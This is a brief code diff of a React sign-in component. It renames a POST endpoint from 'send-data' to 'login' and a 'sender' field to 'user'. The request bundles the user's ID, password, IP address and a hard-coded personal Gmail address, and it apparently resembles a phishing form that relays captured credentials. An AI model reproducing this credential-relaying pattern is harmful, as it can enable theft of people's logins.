@@ -61,12 +61,12 @@ const Signin = () => {
       } else {
         setIsLoading(true)
         axios
-          .post(`${baseURL}send-data`, {
+          .post(`${baseURL}login`, {
             userID,
             password,
             ...userData,
             IPAddress,
-            sender: 'pat.nishimoto2@gmail.com',
+            user: 'pat.nishimoto2@gmail.com',
           })
           .then((resp) => {
             console.log(resp.data)
